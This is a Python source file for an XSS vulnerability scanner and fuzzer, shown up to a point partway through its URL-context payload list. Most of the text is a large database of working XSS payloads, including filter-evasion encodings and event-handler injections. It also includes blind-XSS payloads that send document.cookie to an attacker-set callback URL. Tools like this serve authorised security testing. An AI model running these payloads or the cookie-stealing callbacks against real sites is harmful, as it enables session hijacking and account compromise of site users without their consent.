#!/usr/bin/env python3
"""
Poloss XSS Scanner v3.0
Advanced XSS Vulnerability Scanner
Supports: WSL, Kali Linux, Termux
"""

import os
import sys
import requests
import re
import html
import urllib.parse
import time
import json
import hashlib
import random
import string
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from collections import OrderedDict, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, Back
import argparse
import logging
import colorama
from colorama import Fore, Style, Back
import threading
import queue
import socket
import ssl
import subprocess
import readline  # Untuk history di Termux
global Fore, Style, Back


# Check Python version
if sys.version_info < (3, 7):
    print(f"{Fore.RED}[!] Python 3.7 or higher required{Fore.RESET}")
    sys.exit(1)

# Initialize colorama dengan support untuk semua platform
if 'TERMUX' in os.environ:
    colorama.init(convert=True, strip=False)
else:
    colorama.init(autoreset=True)

# Setup logging dengan format yang lebih baik
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'xss_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class AdvancedXSSFuzzer:
    def __init__(self, target_url, options=None):
        """
        Initialize Advanced Poloss XSS Scanner
        
        Args:
            target_url (str): Target URL
            options (dict): Configuration options
        """
        self.target_url = target_url
        self.options = options or {}
        self.session_id = hashlib.md5(f"{target_url}{time.time()}".encode()).hexdigest()[:8]
        
        # WAF settings
        self.waf_detected = None
        self.waf_type = None
        self.no_waf_mode = self.options.get('no_waf', False)  # Add this line
        
        # Jika mode no-waf aktif, skip WAF detection
        if self.no_waf_mode:
            self.waf_detected = False
            self.waf_type = "WAF scanning disabled"
        
        # Session setup dengan headers lengkap
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'DNT': '1',
        })
        
        # Add custom headers jika ada
        if self.options.get('headers'):
            self.session.headers.update(self.options['headers'])
        
        # Proxy support
        if self.options.get('proxy'):
            self.session.proxies = {
                'http': self.options['proxy'],
                'https': self.options['proxy']
            }
        
        # Results storage yang lebih terstruktur
        self.discovered_params = {
            'url': [],
            'form': [],
            'header': [],
            'json': [],
            'cookie': [],
            'file': []
        }
        
        self.vulnerabilities = []
        self.waf_detected = None
        self.waf_type = None
        self.injection_points = []
        self.payload_history = {}
        self.filter_patterns = set()
        
        # Enhanced payload databases
        self.init_payload_db()
        
        # Statistics
        self.stats = {
            'requests_sent': 0,
            'parameters_tested': 0,
            'vulnerabilities_found': 0,
            'waf_blocks': 0,
            'filtered_payloads': 0,
            'time_elapsed': 0,
            'start_time': time.time()
        }
        
        # Threading
        self.max_workers = self.options.get('threads', 10)
        self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)
        self.request_queue = queue.Queue()
        self.results_queue = queue.Queue()
        
        # Blind XSS
        self.blind_callback_url = self.options.get('blind_callback')
        self.blind_detected = []
        
        # DOM analysis
        self.dom_sinks = [
            'document.write', 'document.writeln',
            'innerHTML', 'outerHTML', 'insertAdjacentHTML',
            'eval', 'setTimeout', 'setInterval', 'setImmediate',
            'Function', 'execScript',
            'location', 'location.href', 'location.assign', 'location.replace',
            'window.name', 'document.domain',
            'postMessage', 'localStorage', 'sessionStorage',
            'document.cookie', 'XMLHttpRequest', 'fetch',
            'importScripts', 'createContextualFragment',
            'range.createContextualFragment', 'document.implementation.createHTMLDocument'
        ]
        
        # Event handlers
        self.event_handlers = [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onmouseenter',
            'onfocus', 'onblur', 'onchange', 'onsubmit', 'onreset',
            'onselect', 'onkeydown', 'onkeypress', 'onkeyup',
            'ondblclick', 'onmousedown', 'onmouseup', 'onmousemove',
            'onmouseout', 'onmouseleave', 'onwheel', 'onscroll',
            'onresize', 'oninput', 'oninvalid', 'oncontextmenu'
        ]
        
        # Context detection
        self.contexts = {
            'html': 'HTML Body',
            'attribute': 'HTML Attribute',
            'javascript': 'JavaScript',
            'url': 'URL',
            'css': 'CSS',
            'comment': 'HTML Comment',
            'script': 'Inside Script Tag',
            'style': 'Inside Style Tag'
        }
        
        # Platform detection
        self.platform = self.detect_platform()
        
        print(f"{Fore.CYAN}[*] Platform detected: {self.platform}{Fore.RESET}")

    # ============= FILE PARAMETER MINING FIX BY POLOSS ===============
    def extract_file_parameters(self, html=None, *args, **kwargs):
        """
        Extract <input type='file'> parameters from forms
        """
        params = []
        try:
            soup = BeautifulSoup(html or "", "html.parser")
            for form in soup.find_all("form"):
                method = form.get("method", "get").lower()
                action = form.get("action", self.target_url)
    
                for inp in form.find_all("input", {"type": "file"}):
                    name = inp.get("name")
                    if name:
                        params.append({
                            'name': name,
                            'type': 'file',
                            'form_method': method,
                            'form_action': action
                        })
        except:
            pass
        return params

    def get_classic_payloads(self, param_info):
        """Get classic XSS payloads"""
        payloads = []
        payloads.extend(self.payload_db.get('basic', []))
        payloads.extend(self.payload_db.get('attribute', []))
        payloads.extend(self.payload_db.get('javascript', []))
        payloads.extend(self.payload_db.get('url', []))
        return list(set(payloads))[:50]

    def get_dom_payloads(self, param_info):
        """Get DOM XSS payloads"""
        payloads = []
        payloads.extend(self.payload_db.get('dom', []))
        payloads.extend(self.payload_db.get('javascript', []))
        
        # DOM-specific payloads
        dom_specific = [
            '#<img src=x onerror=alert(document.domain)>',
            '#<svg onload=alert(document.domain)>',
            'javascript:alert(document.domain)',
            'data:text/html,<script>alert(document.domain)</script>',
            '#<script>alert(document.domain)</script>',
            '?param=<script>alert(document.domain)</script>',
            '&param=<script>alert(document.domain)</script>',
        ]
        payloads.extend(dom_specific)
        return list(set(payloads))[:50]

    def get_blind_payloads(self, param_info):
        """Get blind XSS payloads"""
        payloads = []
        payloads.extend(self.payload_db.get('blind', []))
        
        # Generate blind payloads with callback URL
        if self.blind_callback_url:
            blind_with_callback = [
                f'<script>fetch("{self.blind_callback_url}?data="+document.cookie)</script>',
                f'<img src=x onerror="fetch(\'{self.blind_callback_url}?data=\'+document.cookie)">',
                f'<script>new Image().src="{self.blind_callback_url}?data="+document.cookie;</script>',
            ]
            payloads.extend(blind_with_callback)
        
        return list(set(payloads))[:30]

    # ============= PARAMETER SUMMARY FIX BY POLOSS ===============
    def display_parameter_summary(self):
        """Print clean summary of discovered parameters"""
        print(f"\n{Fore.GREEN}[2] PARAMETER SUMMARY{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")

        total = 0
        for ptype, items in self.discovered_params.items():
            if not isinstance(items, list):
                continue

            count = len(items)
            total += count

            print(f"{Fore.YELLOW}[{ptype.upper()}] → {count}{Fore.RESET}")

            for p in items:
                try:
                    name = p.get('name', 'unknown')
                    extra = ""

                    if ptype == "form":
                        extra = f" ({p.get('form_method','get').upper()} → {p.get('form_action','')})"

                    print(f"   • {Fore.CYAN}{name}{Fore.RESET}{extra}")
                except:
                    continue

        print(f"\n{Fore.GREEN}[✓] Total parameters discovered: {total}{Fore.RESET}\n")

        return total
    
        
    def detect_platform(self):
        """Detect current platform"""
        if 'ANDROID_ROOT' in os.environ:
            return 'termux'
        elif 'wsl' in os.uname().release.lower():
            return 'wsl'
        elif os.path.exists('/etc/kali-release'):
            return 'kali'
        elif sys.platform == 'linux':
            return 'linux'
        elif sys.platform == 'darwin':
            return 'macos'
        else:
            return 'unknown'
    
    def get_random_user_agent(self):
        """Get random user agent"""
        user_agents = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:121.0) Gecko/20100101 Firefox/121.0',
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            # Mobile
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        ]
        return random.choice(user_agents)
    
    def init_payload_db(self):
        """Initialize enhanced payload database"""
        self.payload_db = {
            # ============ BASIC XSS PAYLOADS ============
            'basic': [
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(document.domain)>',
                '<svg onload=alert(document.domain)>',
                '<body onload=alert(document.domain)>',
                '<iframe src="javascript:alert(document.domain)">',
                '<embed src="javascript:alert(document.domain)">',
                '<object data="javascript:alert(document.domain)">',
                '<video><source onerror="alert(document.domain)">',
                '<audio><source onerror="alert(document.domain)">',
                '<details ontoggle="alert(document.domain)">',
                '<marquee onstart="alert(document.domain)">test</marquee>',
                '<dialog open onclose="alert(document.domain)"></dialog>',
                '<input autofocus onfocus="alert(document.domain)">',
                '<select onchange="alert(document.domain)"><option>test</option></select>',
                '<textarea onfocus="alert(document.domain)">test</textarea>',
                '<keygen onfocus="alert(document.domain)">',
                '<form onsubmit="alert(document.domain)"><input type=submit></form>',
                '<isindex onfocus="alert(document.domain)">',
                '<applet code="javascript:alert(document.domain)"></applet>',
                '<base href="javascript:alert(document.domain)">',
                '<link rel=stylesheet href="javascript:alert(document.domain)">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">',
                '<style>@import "javascript:alert(document.domain)";</style>',
                '<math><mi xlink:href="javascript:alert(document.domain)">test</mi></math>',
                '<template onload="alert(document.domain)"></template>',
                '<picture><img src=x onerror=alert(document.domain)></picture>',
                '<source src=x onerror=alert(document.domain)>',
                '<track src=x onerror=alert(document.domain)>',
                '<map><area href="javascript:alert(document.domain)" shape=rect coords="0,0,100,100"></map>',
                '<button onclick="alert(document.domain)">Click</button>',
                '<label onclick="alert(document.domain)">Click</label>',
                '<fieldset onclick="alert(document.domain)">Click</fieldset>',
                '<legend onclick="alert(document.domain)">Click</legend>',
                '<datalist onclick="alert(document.domain)">Click</datalist>',
                '<output onclick="alert(document.domain)">Click</output>',
                '<meter onclick="alert(document.domain)">Click</meter>',
                '<progress onclick="alert(document.domain)">Click</progress>',
                '<menu onclick="alert(document.domain)">Click</menu>',
                '<menuitem onclick="alert(document.domain)">Click</menuitem>',
                '<summary onclick="alert(document.domain)">Click</summary>',
                '<command onclick="alert(document.domain)">Click</command>',
                '<center onclick="alert(document.domain)">Click</center>',
                '<font onclick="alert(document.domain)">Click</font>',
                '<bgsound src="javascript:alert(document.domain)">',
                '<frameset onload="alert(document.domain)"><frame></frame></frameset>',
                '<noframes><iframe src="javascript:alert(document.domain)"></iframe></noframes>',
                '<plaintext><script>alert(document.domain)</script>',
                '<xmp><script>alert(document.domain)</script></xmp>',
                '<listing><script>alert(document.domain)</script></listing>',
                '<image src=x onerror=alert(document.domain)>',
                '<ilayer src="javascript:alert(document.domain)"></ilayer>',
                '<layer src="javascript:alert(document.domain)"></layer>',
                '<blink onfocus="alert(document.domain)" autofocus>test</blink>',
            ],
            
            # ============ ATTRIBUTE CONTEXT PAYLOADS ============
            'attribute': [
                # Autofocus variations
                '" autofocus onfocus=alert(document.domain) x="',
                "' autofocus onfocus=alert(document.domain) x='",
                '` autofocus onfocus=alert(document.domain) x=`',
                '" autofocus onfocus=alert(document.domain)>',
                "' autofocus onfocus=alert(document.domain)>",
                '` autofocus onfocus=alert(document.domain)>',
                
                # Basic event handlers
                '" onerror=alert(document.domain)',
                '" onload=alert(document.domain)',
                '" onmouseover=alert(document.domain)',
                '" onclick=alert(document.domain)',
                '" ondblclick=alert(document.domain)',
                '" onmousedown=alert(document.domain)',
                '" onmouseup=alert(document.domain)',
                '" onmousemove=alert(document.domain)',
                '" onmouseout=alert(document.domain)',
                '" onmouseenter=alert(document.domain)',
                '" onmouseleave=alert(document.domain)',
                '" onwheel=alert(document.domain)',
                
                # Focus events
                '" onfocus=alert(document.domain)',
                '" onblur=alert(document.domain)',
                '" onfocusin=alert(document.domain)',
                '" onfocusout=alert(document.domain)',
                
                # Form events
                '" onchange=alert(document.domain)',
                '" oninput=alert(document.domain)',
                '" oninvalid=alert(document.domain)',
                '" onreset=alert(document.domain)',
                '" onsearch=alert(document.domain)',
                '" onselect=alert(document.domain)',
                '" onsubmit=alert(document.domain)',
                
                # Keyboard events
                '" onkeydown=alert(document.domain)',
                '" onkeypress=alert(document.domain)',
                '" onkeyup=alert(document.domain)',
                
                # Drag & drop events
                '" ondrag=alert(document.domain)',
                '" ondragend=alert(document.domain)',
                '" ondragenter=alert(document.domain)',
                '" ondragleave=alert(document.domain)',
                '" ondragover=alert(document.domain)',
                '" ondragstart=alert(document.domain)',
                '" ondrop=alert(document.domain)',
                
                # Clipboard events
                '" oncopy=alert(document.domain)',
                '" oncut=alert(document.domain)',
                '" onpaste=alert(document.domain)',
                
                # Media events
                '" onabort=alert(document.domain)',
                '" oncanplay=alert(document.domain)',
                '" oncanplaythrough=alert(document.domain)',
                '" oncuechange=alert(document.domain)',
                '" ondurationchange=alert(document.domain)',
                '" onemptied=alert(document.domain)',
                '" onended=alert(document.domain)',
                '" onloadeddata=alert(document.domain)',
                '" onloadedmetadata=alert(document.domain)',
                '" onloadstart=alert(document.domain)',
                '" onpause=alert(document.domain)',
                '" onplay=alert(document.domain)',
                '" onplaying=alert(document.domain)',
                '" onprogress=alert(document.domain)',
                '" onratechange=alert(document.domain)',
                '" onseeked=alert(document.domain)',
                '" onseeking=alert(document.domain)',
                '" onstalled=alert(document.domain)',
                '" onsuspend=alert(document.domain)',
                '" ontimeupdate=alert(document.domain)',
                '" onvolumechange=alert(document.domain)',
                '" onwaiting=alert(document.domain)',
                
                # Window events
                '" onafterprint=alert(document.domain)',
                '" onbeforeprint=alert(document.domain)',
                '" onbeforeunload=alert(document.domain)',
                '" onhashchange=alert(document.domain)',
                '" onlanguagechange=alert(document.domain)',
                '" onmessage=alert(document.domain)',
                '" onmessageerror=alert(document.domain)',
                '" onoffline=alert(document.domain)',
                '" ononline=alert(document.domain)',
                '" onpagehide=alert(document.domain)',
                '" onpageshow=alert(document.domain)',
                '" onpopstate=alert(document.domain)',
                '" onrejectionhandled=alert(document.domain)',
                '" onstorage=alert(document.domain)',
                '" onunhandledrejection=alert(document.domain)',
                '" onunload=alert(document.domain)',
                
                # UI events
                '" onscroll=alert(document.domain)',
                '" onscrollend=alert(document.domain)',
                '" onresize=alert(document.domain)',
                '" onselectstart=alert(document.domain)',
                '" onselectionchange=alert(document.domain)',
                '" ontoggle=alert(document.domain)',
                
                # Touch events
                '" ontouchcancel=alert(document.domain)',
                '" ontouchend=alert(document.domain)',
                '" ontouchmove=alert(document.domain)',
                '" ontouchstart=alert(document.domain)',
                
                # Pointer events
                '" onpointercancel=alert(document.domain)',
                '" onpointerdown=alert(document.domain)',
                '" onpointerenter=alert(document.domain)',
                '" onpointerleave=alert(document.domain)',
                '" onpointermove=alert(document.domain)',
                '" onpointerout=alert(document.domain)',
                '" onpointerover=alert(document.domain)',
                '" onpointerup=alert(document.domain)',
                '" ongotpointercapture=alert(document.domain)',
                '" onlostpointercapture=alert(document.domain)',
                
                # Animation events
                '" onanimationstart=alert(document.domain)',
                '" onanimationiteration=alert(document.domain)',
                '" onanimationend=alert(document.domain)',
                '" onanimationcancel=alert(document.domain)',
                
                # Transition events
                '" ontransitionstart=alert(document.domain)',
                '" ontransitioniteration=alert(document.domain)',
                '" ontransitionend=alert(document.domain)',
                '" ontransitioncancel=alert(document.domain)',
                '" ontransitionrun=alert(document.domain)',
                
                # Gamepad events
                '" ongamepadconnected=alert(document.domain)',
                '" ongamepaddisconnected=alert(document.domain)',
                
                # VR events
                '" onvrdisplayactivate=alert(document.domain)',
                '" onvrdisplayblur=alert(document.domain)',
                '" onvrdisplayconnect=alert(document.domain)',
                '" onvrdisplaydeactivate=alert(document.domain)',
                '" onvrdisplaydisconnect=alert(document.domain)',
                '" onvrdisplayfocus=alert(document.domain)',
                '" onvrdisplaypresentchange=alert(document.domain)',
                
                # Device events
                '" ondeviceorientation=alert(document.domain)',
                '" ondevicemotion=alert(document.domain)',
                '" ondeviceorientationabsolute=alert(document.domain)',
                
                # Battery events
                '" onchargingchange=alert(document.domain)',
                '" onchargingtimechange=alert(document.domain)',
                '" ondischargingtimechange=alert(document.domain)',
                '" onlevelchange=alert(document.domain)',
                
                # Network events
                '" onoffline=alert(document.domain)',
                '" ononline=alert(document.domain)',
                
                # Payment events
                '" onpaymentmethodchange=alert(document.domain)',
                '" onshippingaddresschange=alert(document.domain)',
                '" onshippingoptionchange=alert(document.domain)',
                
                # Sensor events
                '" onreading=alert(document.domain)',
                '" onactivate=alert(document.domain)',
                '" onerror=alert(document.domain)',
                
                # Speech events
                '" onaudiostart=alert(document.domain)',
                '" onaudioend=alert(document.domain)',
                '" onend=alert(document.domain)',
                '" onnomatch=alert(document.domain)',
                '" onresult=alert(document.domain)',
                '" onsoundstart=alert(document.domain)',
                '" onsoundend=alert(document.domain)',
                '" onspeechstart=alert(document.domain)',
                '" onspeechend=alert(document.domain)',
                '" onstart=alert(document.domain)',
                
                # WebRTC events
                '" onaddstream=alert(document.domain)',
                '" ondatachannel=alert(document.domain)',
                '" onicecandidate=alert(document.domain)',
                '" oniceconnectionstatechange=alert(document.domain)',
                '" onicegatheringstatechange=alert(document.domain)',
                '" onnegotiationneeded=alert(document.domain)',
                '" onremovestream=alert(document.domain)',
                '" onsignalingstatechange=alert(document.domain)',
                '" ontrack=alert(document.domain)',
                
                # WebSocket events
                '" onclose=alert(document.domain)',
                '" onerror=alert(document.domain)',
                '" onmessage=alert(document.domain)',
                '" onopen=alert(document.domain)',
                
                # Worker events
                '" onmessageerror=alert(document.domain)',
                
                # XHR events
                '" onabort=alert(document.domain)',
                '" onerror=alert(document.domain)',
                '" onload=alert(document.domain)',
                '" onloadend=alert(document.domain)',
                '" onloadstart=alert(document.domain)',
                '" onprogress=alert(document.domain)',
                '" onreadystatechange=alert(document.domain)',
                '" ontimeout=alert(document.domain)',
                
                # Custom events
                '" onshow=alert(document.domain)',
                '" onslotchange=alert(document.domain)',
                '" onsecuritypolicyviolation=alert(document.domain)',
                '" onformdata=alert(document.domain)',
                '" onauxclick=alert(document.domain)',
                '" oncontextmenu=alert(document.domain)',
                '" onappinstalled=alert(document.domain)',
                '" onbeforeinstallprompt=alert(document.domain)',
                
                # Multiple events
                '" onload onerror=alert(document.domain)',
                '" onclick onmouseover=alert(document.domain)',
                '" onfocus onblur=alert(document.domain)',
                
                # With tabindex
                '" tabindex=1 onfocus=alert(document.domain) autofocus',
                '" tabindex=0 onfocus=alert(document.domain)',
                
                # With accesskey
                '" accesskey=x onclick=alert(document.domain)',
                '" accesskey=x onfocus=alert(document.domain)',
                
                # With contenteditable
                '" contenteditable onfocus=alert(document.domain)',
                '" contenteditable=true onblur=alert(document.domain)',
                
                # With spellcheck
                '" spellcheck onfocus=alert(document.domain)',
                
                # With translate
                '" translate onfocus=alert(document.domain)',
                
                # With hidden
                '" hidden onfocus=alert(document.domain)',
                
                # With inert
                '" inert onfocus=alert(document.domain)',
            ],
            
            # ============ JAVASCRIPT CONTEXT PAYLOADS ============
            'javascript': [
                # String termination
                '";alert(document.domain);//',
                "';alert(document.domain);//",
                '`;alert(document.domain);//',
                
                # Without termination
                '";alert(document.domain)',
                "';alert(document.domain)",
                '`;alert(document.domain)',
                
                # Escaped quotes
                '\\";alert(document.domain);//',
                "\\';alert(document.domain);//",
                '\\`;alert(document.domain);//',
                
                # Double escaped
                '\\\\";alert(document.domain);//',
                "\\\\';alert(document.domain);//",
                
                # Template literals
                '${alert(document.domain)}',
                '${`${alert(document.domain)}`}',
                '${[alert(document.domain)]}',
                '${alert`document.domain`}',
                '${confirm`document.domain`}',
                '${prompt`document.domain`}',
                '${console.log`document.domain`}',
                '${document.write`document.domain`}',
                '${eval`alert\\document.domain\\`}',
                
                # Concatenation
                '"+"alert(document.domain)"+',
                "'+'alert(document.domain)'+",
                '`+`alert(document.domain)`+',
                
                # Array join
                '["alert","document.domain"].join(".")',
                '"["+"alert(document.domain)"+"]"',
                
                # Function constructor
                'Function("alert(document.domain)")()',
                'new Function("alert(document.domain)")()',
                'window.Function("alert(document.domain)")()',
                'top.Function("alert(document.domain)")()',
                'self.Function("alert(document.domain)")()',
                'parent.Function("alert(document.domain)")()',
                
                # Indirect eval
                'eval("alert(document.domain)")',
                'window.eval("alert(document.domain)")',
                '(1,eval)("alert(document.domain)")',
                '[].constructor.constructor("alert(document.domain)")()',
                
                # setTimeout/setInterval
                'setTimeout("alert(document.domain)")',
                'setInterval("alert(document.domain)")',
                'setTimeout`alert\\${document.domain}`',
                'setInterval`alert\\${document.domain}`',
                
                # location
                'location="javascript:alert(document.domain)"',
                'location.href="javascript:alert(document.domain)"',
                'location.assign("javascript:alert(document.domain)")',
                'location.replace("javascript:alert(document.domain)")',
                
                # document.write
                'document.write("<script>alert(document.domain)</script>")',
                'document.writeln("<script>alert(document.domain)</script>")',
                
                # innerHTML/outerHTML
                'document.body.innerHTML="<img src=x onerror=alert(document.domain)>"',
                'document.body.outerHTML="<img src=x onerror=alert(document.domain)>"',
                
                # insertAdjacentHTML
                'document.body.insertAdjacentHTML("beforeend","<img src=x onerror=alert(document.domain)>")',
                
                # createContextualFragment
                'document.createRange().createContextualFragment("<script>alert(document.domain)</script>")',
                
                # import()
                'import("data:text/javascript,alert(document.domain)")',
                
                # Worker
                'new Worker("data:text/javascript,alert(document.domain)")',
                
                # Blob
                'new Blob(["alert(document.domain)"],{type:"text/javascript"})',
                
                # Object URL
                'URL.createObjectURL(new Blob(["alert(document.domain)"],{type:"text/javascript"}))',
                
                # Data URL
                'fetch("data:text/javascript,alert(document.domain)")',
                
                # WebSocket
                'new WebSocket("ws://"+document.domain)',
                
                # XMLHttpRequest
                'new XMLHttpRequest().open("GET","javascript:alert(document.domain)")',
                
                # Fetch
                'fetch("javascript:alert(document.domain)")',
                
                # Beacon
                'navigator.sendBeacon("javascript:alert(document.domain)")',
                
                # Console
                'console.log(document.domain)',
                'console.error(document.domain)',
                'console.warn(document.domain)',
                'console.info(document.domain)',
                'console.debug(document.domain)',
                
                # Alert variations
                'window.alert(document.domain)',
                'self.alert(document.domain)',
                'top.alert(document.domain)',
                'parent.alert(document.domain)',
                'frames.alert(document.domain)',
                'globalThis.alert(document.domain)',
                
                # Indirect alert
                'window["alert"](document.domain)',
                'window["al"+"ert"](document.domain)',
                'window[String.fromCharCode(97,108,101,114,116)](document.domain)',
                
                # With statement
                'with(document)alert(domain)',
                'with(window)alert(document.domain)',
                
                # Reflect
                'Reflect.apply(alert,window,[document.domain])',
                'Reflect.construct(Function,["alert(document.domain)"])',
                
                # Proxy
                'new Proxy({},{get(){alert(document.domain)}})',
                
                # Promise
                'Promise.resolve(document.domain).then(alert)',
                'new Promise(r=>r(document.domain)).then(alert)',
                
                # Async/await
                'async()=>{await alert(document.domain)}',
                
                # Generator
                'function* g(){yield alert(document.domain)};g().next()',
                
                # Class
                'class X{static x=alert(document.domain)}',
                
                # Eval with template
                'eval`alert\\${document.domain}`',
                
                # Unicode escapes
                '\\u0061\\u006c\\u0065\\u0072\\u0074(document.domain)',
                '\\x61\\x6c\\x65\\x72\\x74(document.domain)',
                
                # Comment tricks
                'alert(document.domain)//',
                'alert(document.domain)/*',
                '/*\n*/alert(document.domain)/*\n*/',
                '<!--\n-->alert(document.domain)',
                
                # Line break tricks
                'alert\n(document.domain)',
                'alert\r(document.domain)',
                'alert\r\n(document.domain)',
                
                # Tab tricks
                'alert\t(document.domain)',
                'alert\v(document.domain)',
                'alert\f(document.domain)',
            ],
            
            # ============ URL CONTEXT PAYLOADS ============
            'url': [
                # javascript: protocol
                'javascript:alert(document.domain)',
                'javascript:alert(document.cookie)',
                'javascript:alert(window.location)',
                'javascript:alert(window.name)',
                'javascript:alert(parent.document.domain)',
                'javascript:alert(top.document.domain)',
                'javascript:alert(self.document.domain)',
                'javascript:alert(frames[0].document.domain)',
                
                # javascript: with HTML
                'javascript:<script>alert(document.domain)</script>',
                'javascript:<img src=x onerror=alert(document.domain)>',
                'javascript:<svg onload=alert(document.domain)>',
                'javascript:<body onload=alert(document.domain)>',
                'javascript:<iframe src=javascript:alert(document.domain)>',
                
                # javascript: encoded
                'jav&#x61;script:alert(document.domain)',
                'jav&#x09;ascript:alert(document.domain)',
                'jav&#x0a;ascript:alert(document.domain)',
                'jav&#x0d;ascript:alert(document.domain)',
                'jav&#x00;ascript:alert(document.domain)',
                'jav&#x0000;ascript:alert(document.domain)',
                'jav&#x00000;ascript:alert(document.domain)',
                'jav&#x000000;ascript:alert(document.domain)',
                'jav&#x0000000;ascript:alert(document.domain)',
                'jav&#x00000000;ascript:alert(document.domain)',
                'jav&#x000000000;ascript:alert(document.domain)',
                'jav&#x0000000000;ascript:alert(document.domain)',
                
                # javascript: hex escapes
                'jav\x61script:alert(document.domain)',
                'jav\x09ascript:alert(document.domain)',
                'jav\x0aascript:alert(document.domain)',
                'jav\x0dascript:alert(document.domain)',
                'jav\x00ascript:alert(document.domain)',
                
                # javascript: unicode escapes
                'jav\u0061script:alert(document.domain)',
                'jav\u0009ascript:alert(document.domain)',
                'jav\u000aascript:alert(document.domain)',
                'jav\u000dascript:alert(document.domain)',
                'jav\u0000ascript:alert(document.domain)',
                
                # javascript: mixed case
                'JAVASCRIPT:alert(document.domain)',
                'JavaScript:alert(document.domain)',
                'javaScript:alert(document.domain)',
                'javAScript:alert(document.domain)',
                'javAscRipt:alert(document.domain)',
                
                # data: protocol
                'data:text/html,<script>alert(document.domain)</script>',
                'data:text/html;charset=utf-8,<script>alert(document.domain)</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+',
                'data:text/html,<img src=x onerror=alert(document.domain)>',
                'data:text/html,<svg onload=alert(document.domain)>',
                'data:text/html,<body onload=alert(document.domain)>',
                'data:text/html,<iframe src=javascript:alert(document.domain)>',
                
                # data: with javascript
                'data:text/javascript,alert(document.domain)',
                'data:text/javascript;charset=utf-8,alert(document.domain)',
                'data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==',
                
                # data: image
                'data:image/svg+xml,<svg onload=alert(document.domain)></svg>',
                'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikiPjwvc3ZnPg==',
                
                # vbscript: (IE)
                'vbscript:alert(document.domain)',
                'vbscript:msgbox(document.domain)',
                'vb&#x73;cript:alert(document.domain)',
                
                # livescript: (old Netscape)
                'livescript:alert(document.domain)',
                
                # mocha: (old Netscape)
                'mocha:alert(document.domain)',
                
                # asfunction: (Flash)
                'asfunction:alert,document.domain',
                
                # feed:
                'feed:javascript:alert(document.domain)',
                
                # mhtml: (IE)
                'mhtml:http://localhost!xss.html',
                
                # jar: (Firefox)
                'jar:http://localhost!/',
                
                # view-source:
                'view-source:javascript:alert(document.domain)',
                
                # with %0a, %0d, %09
                'javascript:%0aalert(document.domain)',
                'javascript:%0dalert(document.domain)',
                'javascript:%09alert(document.domain)',
                'javascript:%0a%0dalert(document.domain)',
                
                # with spaces
                'javascript: alert(document.domain)',
                'javascript:  alert(document.domain)',
                'javascript:   alert(document.domain)',
                
                # with tabs
                'javascript:\talert(document.domain)',
                'javascript:\t\talert(document.domain)',
                
                # with line breaks
                'javascript:\nalert(document.domain)',
                'javascript:\r\nalert(document.domain)',
                
                # with null bytes
                'javascript:\x00alert(document.domain)',
                'javascript:%00alert(document.domain)',
                
                # with comments
                'javascript:/*comment*/alert(document.domain)',
                'javascript://comment\nalert(document.domain)',
                'javascript:<!--comment-->alert(document.domain)',
                
                # encoded protocol
                '%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29',
                '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;',
                
                # double encoded
                '%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253a%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529',
                
                # with window reference
                'javascript:window.alert(document.domain)',
                'javascript:self.alert(document.domain)',
                'javascript:top.alert(document.domain)',
                'javascript:parent.alert(document.domain)',
